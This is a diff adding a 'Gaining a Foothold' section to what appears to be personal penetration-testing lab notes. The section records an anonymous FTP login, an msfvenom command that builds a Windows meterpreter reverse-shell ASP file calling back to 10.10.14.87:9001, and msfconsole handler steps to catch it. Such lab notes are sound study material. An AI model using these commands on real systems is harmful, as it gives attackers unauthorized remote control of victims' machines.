@@ -63,3 +63,23 @@ Sushant 747's Guide (Country dependant - may need VPN) - https://sushant747.gitb
 
 ### Gaining a Foothold (Box 1)
 
+Open HTTP and FTP Service:
+
+FTP Server allow `anonymous` and as password `*anything*` Login.
+
+> [!todo] 
+> Create meterpreter web reverse shell
+> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.87 LPORT=9001 -f asp > shell.asp`
+> 
+
+> [!todo] 
+> run `msfconsole`
+> `use exploit/multi/handler` 
+> `show options`
+> `set lhost tun0`
+> `set lport 9001`
+> `set payload windows/meterpreter/reverse_tcp`
+> `run`
+
+
+
